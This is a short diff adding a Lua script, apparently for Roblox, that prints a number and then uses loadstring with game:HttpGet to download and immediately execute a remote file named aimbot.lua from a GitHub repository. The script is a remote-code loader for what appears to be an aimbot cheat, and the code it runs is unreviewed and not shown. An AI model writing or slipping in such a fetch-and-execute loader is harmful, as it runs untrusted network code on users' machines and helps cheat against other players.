@@ -1,0 +1,2 @@
+print(2.0)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gatuhh/aimbot.lua/refs/heads/main/aimbot.lua"))()
